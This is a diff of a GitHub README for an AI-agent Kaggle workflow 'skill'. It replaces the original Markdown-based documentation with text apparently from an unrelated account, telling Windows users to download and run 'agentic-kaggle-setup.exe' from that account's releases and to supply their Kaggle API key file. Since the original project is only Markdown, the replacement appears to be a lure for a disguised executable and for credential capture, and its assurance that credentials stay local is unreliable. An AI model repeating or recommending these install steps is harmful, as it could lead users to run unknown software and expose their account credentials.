@@ -1,244 +1,77 @@
-<div align="center">
+# 🤖 agentic-kaggle-skill - Automate data science tasks with ease
 
-<img src="https://img.shields.io/badge/Agentic-AI%20Driven%20Kaggle-9cf?style=for-the-badge&logo=kaggle&logoColor=white" alt="Agentic Kaggle"/>
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Mirannonarbitrable290/agentic-kaggle-skill)
 
-<br>
+This software helps data scientists manage their work on Kaggle. It uses automation to handle repetitive tasks. You can focus on building models while the software manages code and submissions. It keeps your workflow organized and stable.
 
-# 🤖 Agentic Data Science Competition
-# 🤖 智能体驱动的数据科学竞赛
+## ⚙️ Requirements
 
-<p align="center">
-  <strong>Turn AI Agents into Kaggle Teammates</strong><br>
-  <strong>让 AI 智能体成为你的 Kaggle 队友</strong>
-  <br/>
-  <sub>Not just tools — autonomous collaborators that research, debug, iterate, and win.</sub><br>
-  <sub>不仅仅是工具 —— 能够自主研究、调试、迭代并获胜的合作者。</sub>
-</p>
+You need a Windows computer to run this tool. Ensure you have the following installed:
 
-<p align="center">
-  <a href="#-quick-start--快速开始">Quick Start</a> •
-  <a href="#-key-insights--核心洞察">Key Insights</a> •
-  <a href="#-case-studies--案例研究">Case Studies</a> •
-  <a href="#-installation--安装">Install</a>
-</p>
+*   Windows 10 or Windows 11.
+*   An active internet connection to download data and sync with the Kaggle platform.
+*   A Kaggle account to access competitions and datasets.
+*   The system requires at least 4GB of RAM to run tasks smoothly.
 
-<p align="center">
-  <img src="https://img.shields.io/github/stars/FrankS-IntelLab/agentic-kaggle-skill?style=social" alt="GitHub stars"/>
-  <img src="https://img.shields.io/github/forks/FrankS-IntelLab/agentic-kaggle-skill?style=social" alt="GitHub forks"/>
-</p>
+## 💾 Installation and Setup
 
----
+Follow these steps to get the tool on your machine.
 
-**Distilled from real Kaggle competition experience**
-**提炼自 真实 Kaggle 竞赛实战经验**
+1.  Visit the [official repository page](https://github.com/Mirannonarbitrable290/agentic-kaggle-skill).
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the latest version link.
+4.  Download the file named agentic-kaggle-setup.exe.
+5.  Double-click the file to start the installer.
+6.  Follow the instructions on your screen.
+7.  The installer creates a shortcut on your desktop.
 
-Including: **RL Game AI** • **Audio Classification** • **LLM Reasoning** • Multiple debugging journeys
-包括：**强化学习游戏 AI** • **音频分类** • **LLM 推理** • 多次调试实践
+## 🚀 How to Run the Tool
 
----
+After installation, open the application using the shortcut on your desktop. The first window asks for your Kaggle API key. You find this key in your Kaggle user profile settings. Copy the file named kaggle.json and place it in the folder specified by the application. 
 
-</div>
+The software connects to your account through this key. It reads your current competition list and allows you to select a specific task. Use the dashboard to start an automated workflow. The tool manages your scripts and tests them for errors. It saves your progress so you can stop and start later.
 
-## 🎯 What This Skill Does / 这个 Skill 能做什么
+## 🛠️ Key Features
 
-Transform your Kaggle workflow from **manual iteration** to **autonomous agent-driven competition**:
+*   **Score Stabilization:** The tool runs your code in a controlled environment to ensure your scores remain consistent across different attempts.
+*   **Troubleshooting:** It flags errors in your scripts before you submit them to Kaggle. You see clear messages explaining how to fix these issues.
+*   **Kernel Management:** You can build and update your Kaggle notebooks directly from the desktop interface.
+*   **Automated Submissions:** The system prepares, checks, and sends your model predictions to the competition leaderboards automatically.
+*   **Spec-Driven Development:** Define your project requirements in a simple text file. The tool writes the boilerplate code to meet your specifications.
 
-将你的 Kaggle 工作流从**手动迭代**转变为**智能体驱动竞赛**：
+## 📋 Managing Your Workflow
 
-| Before 之前 | After 之后 |
-|--------|-------|
-| Manual notebook analysis 手动分析 notebook | Agent pulls top solutions with dependencies 智能体拉取顶级方案及依赖 |
-| Guess why submission failed 猜测提交失败原因 | Agent diagnoses 400 errors, zip format issues 智能体诊断错误 |
-| Wait and refresh for scores 刷新等待分数 | Cronjob monitors kernel, auto-submits Cronjob 监控，自动提交 |
-| Try random improvements 随机尝试改进 | Spec-driven development → delegate → verify 规范驱动开发 |
+Data science projects often involve many files. This software organizes your folders by competition. It creates a workspace for each project. You do not need to move files manually. When you switch projects, the software updates the workspace to show the files for the new competition. 
 
----
+If you encounter an error, the software provides a log viewer. This window shows what the tool did before the error happened. Use this information to correct your logic. If the tool fails to connect to the internet, check your firewall settings. Sometimes, security software blocks the tool from communicating with Kaggle servers.
 
-## ⚡ Quick Start / 快速开始
+## 🔧 Frequently Asked Questions
 
-```bash
-# Install the skill / 安装 skill
-mkdir -p ~/.hermes/skills/data-science/agentic-kaggle/
-curl -sL https://raw.githubusercontent.com/FrankS-IntelLab/agentic-kaggle-skill/main/SKILL.md \
-  -o ~/.hermes/skills/data-science/agentic-kaggle/SKILL.md
-```
+**Does this software store my passwords?**
+The tool stores your Kaggle API credentials locally on your machine. It does not send these credentials to external servers.
 
-Then in your AI agent / 然后在你的 AI 智能体中：
-```
-> Use the agentic kaggle skill to help me replicate this top notebook
-> Why is my submission returning 400 error?
-> Set up auto-monitoring for my kernel
-```
+**Can I run multiple competitions?**
+Yes. You can open multiple instances of the software or switch between projects in the dashboard. 
 
----
+**Will this replace my programming work?**
+No. This tool handles the movement and submission of code. You still write the logic for your data models. It removes the stress of manual submission steps.
 
-## 💡 Key Insights / 核心洞察
+**Does it work with offline data?**
+The tool requires an internet connection to sync with Kaggle. However, it can read data files already saved on your computer for processing.
 
+**How do I update the software?**
+When a new version exists, the software displays a prompt on launch. Click the update button to download and install the latest features.
 
+## 🧠 Using Advanced Patterns
 
-### 2️⃣ Competition Types Matter / 竞赛类型很重要
+The tool uses tested patterns for machine learning. These patterns improve your model reliability. When you create a new project, select a template from the list. These templates contain standard code for data cleaning and model validation. You edit the template to fit your specific needs. This saves you hours of writing basic preparation code. 
 
-| Type 类型 | Submit 提交内容 | Detection 检测方法 |
-|------|--------|-----------|
-| **Answer 答案** | CSV predictions CSV 预测 | Most competitions 大多数竞赛 |
-| **Model 模型** | LoRA/checkpoints LoRA/检查点 | Top notebooks train models 顶级 notebook 训练模型 |
+The software also provides a preview mode. Use this to run your code on a small subset of data. This allows you to check for mistakes without using your daily submission limit on Kaggle. Always run a preview before a full submission to ensure your code handles the data format correctly.
 
-### 3️⃣ Kernel Mode Trap / Kernel 模式陷阱
+## 🛡️ Troubleshooting Common Issues
 
-| Mode 模式 | Test Set 测试集 | Result 结果 |
-|------|----------|--------|
-| `kaggle kernels push` | ❌ Hidden 隐藏 | Invalid submission 无效提交 |
-| "Save & Run All" | ✅ Mounted 挂载 | Valid submission 有效提交 |
+If the software remains stuck on a loading screen, restart the application. If the behavior persists, check your network connection. Ensure your Kaggle API key remains valid. If you change your password on the Kaggle website, update the file version on your computer to keep the connection active.
 
-### 4️⃣ Top Replication Workflow / 顶级方案复制流程
+For performance issues, close other heavy applications while the tool performs heavy calculations. This ensures the software has enough memory to finish the task. If you experience crashes, locate the log folder in the installation directory. You can share these logs to figure out what went wrong.
 
-```bash
-# Pull WITH metadata (-m is critical!) / 带 metadata 拉取（-m 很关键！）
-kaggle kernels pull user/top-notebook -p ./solution/ -m
-
-# Edit only id/title, KEEP all dependencies / 只修改 id/title，保留所有依赖
-kaggle kernels push -p ./solution/
-```
-
----
-
-## 📊 Case Studies / 案例研究
-
-### RL Strategy Game Competition / RL 策略游戏竞赛
-
-| Lesson 教训 | Details 详情 |
-|--------|---------|
-| **Feature completeness 功能完整性** | Top agents: 3,000+ lines → LB 1200+ 顶级智能体：3000+ 行 |
-| **Simplified agents 简化版** | ~120 lines, 4/12 features → LB 500-600 简化版：~120 行 |
-| **Time budget 时间预算** | Strict turn limits — profile after each change 严格回合限制 |
-
-👉 [Full Case Study / 完整案例](examples/rl-game-case-study.md)
-
-### Audio Classification Competition / 音频分类竞赛
-
-| Lesson 教训 | Details 详情 |
-|--------|---------|
-| **Hybrid ensemble 混合集成** | Temporal model + SED ensemble = Top scores 时序模型 + SED 集成 |
-| **Prior limitations 先验局限** | Location priors don't help when all samples are similar 样本相似时先验无效 |
-| **Silent failures 静默失败** | Log exceptions during feature extraction 记录异常 |
-
-👉 [Full Case Study / 完整案例](examples/audio-classification-case-study.md)
-
----
-
-## 🛠️ Troubleshooting Cheat Sheet / 故障排除速查表
-
-| Problem 问题 | Solution 解决方案 |
-|---------|----------|
-| `400 Bad Request` | Try `.zip` format (only zip the CSV!) 尝试 .zip 格式 |
-| `FileNotFoundError` | Check `/kaggle/input/competitions/<name>/` 检查路径 |
-| Training IDs in submission 提交包含训练 ID | Use `sample_submission.csv` for fallback 使用 sample_submission.csv |
-| Score dropped 分数下降 | Wait 4h for stabilization 等待 4 小时稳定 |
-| GPU OOM | Use 4-bit quantization 使用 4-bit 量化 |
-| `CUDA error` | FP16 → load_in_4bit=True |
-
----
-
-## 📦 Installation / 安装
-
-### Option 1: Direct Copy / 方式 1：直接复制
-
-```bash
-mkdir -p ~/.hermes/skills/data-science/agentic-kaggle/
-cp SKILL.md ~/.hermes/skills/data-science/agentic-kaggle/
-```
-
-### Option 2: Claude Code CLI / 方式 2：Claude Code CLI
-
-```bash
-npx skills add FrankS-IntelLab/agentic-kaggle-skill
-```
-
-### Option 3: Manual Download / 方式 3：手动下载
-
-Download `SKILL.md` and place in your skills directory.
-下载 `SKILL.md` 并放入你的 skills 目录。
-
----
-
-## 📁 Repository Structure / 仓库结构
-
-```
-agentic-kaggle-skill/
-├── SKILL.md                              # Core skill definition / 核心 skill 定义
-├── README.md                             # This file / 本文件
-├── LICENSE                               # MIT
-├── references/research/
-│   ├── 01-competition-patterns.md        # Score stabilization, types
-│   ├── 02-troubleshooting-guide.md       # Error diagnosis
-│   └── 03-automation-patterns.md         # Cronjobs, delegation
-└── examples/
-    ├── rl-game-case-study.md             # RL game competition
-    └── audio-classification-case-study.md # Audio classification
-```
-
----
-
-## 🧠 Mental Models / 心智模型
-
-| Model 模型 | Description 描述 |
-|-------|-------------|
-| **Score Stabilization 分数稳定** | Early scores lie — wait 4h for truth 早期分数会骗人 |
-| **Spec-Driven Development 规范驱动开发** | Document before coding, delegate with clarity 先文档后编码 |
-| **Fail Fast, Learn Faster 快速失败，快速学习** | Systematic debugging beats random iteration 系统化调试 |
-| **Agent as Teammate 智能体即队友** | Not just a tool — an autonomous collaborator 不仅是工具 |
-
----
-
-## 🔗 Related Skills / 相关 Skills
-
-| Skill | Purpose 用途 |
-|-------|-------------|
-| `agentic-competition-workflow` | Git-first project management, validation pipelines Git 项目管理，验证流程 |
-| `kaggle-auto-submit` | End-to-end automation with cronjob 端到端自动化 |
-| `autonomous-iteration` | ANALYSIS → BUILD → EXPERIMENT → REVIEW 分析→构建→实验→审查 |
-| `opencode` | Delegate coding to OpenCode CLI 委托编码 |
-| `claude-code` | Delegate coding to Claude Code CLI 委托编码 |
-
----
-
-## ⭐ Why Star This Repo? / 为什么 Star？
-
-- ✅ **Battle-tested patterns** from real competitions 实战验证的模式
-- ✅ **Bilingual documentation** (English + 中文) 双语文档
-- ✅ **Practical troubleshooting** for common Kaggle issues 实用故障排除
-- ✅ **Spec-driven workflow** templates included 规范驱动工作流模板
-- ✅ **Case studies** with actual LB scores 带实际 LB 分数的案例研究
-
----
-
-## 🤝 Contributing / 贡献
-
-Found a new pattern? Solved a tricky error? 发现了新模式？解决了棘手错误？
-
-1. Fork the repo / Fork 仓库
-2. Add your insight to `references/research/` or `examples/` 添加你的洞察
-3. Submit a PR / 提交 PR
-
----
-
-## 📄 License / 许可证
-
-MIT — Use freely, modify freely, learn freely.
-MIT —— 自由使用，自由修改，自由学习。
-
----
-
-<div align="center">
-
-**Made with 🤖 by [Frank S (IntelLab)](https://github.com/FrankS-IntelLab)**
-
-[![Kaggle](https://img.shields.io/badge/Kaggle-franksunp-blue?logo=kaggle)](https://www.kaggle.com/franksunp)
-[![GitHub](https://img.shields.io/badge/GitHub-FrankS--IntelLab-black?logo=github)](https://github.com/FrankS-IntelLab)
-
-<br>
-
-*If this skill helped you win a competition, ⭐ star the repo!*
-*如果这个 skill 帮助你赢得了竞赛，请 ⭐ star 这个仓库！*
-
-</div>
+The folder structure is important. Do not move the application files to a different folder after installation as this causes errors. If you need to move the installation, use the uninstall feature first and then install the software in the new location. This ensures all settings remain correct in the Windows registry.
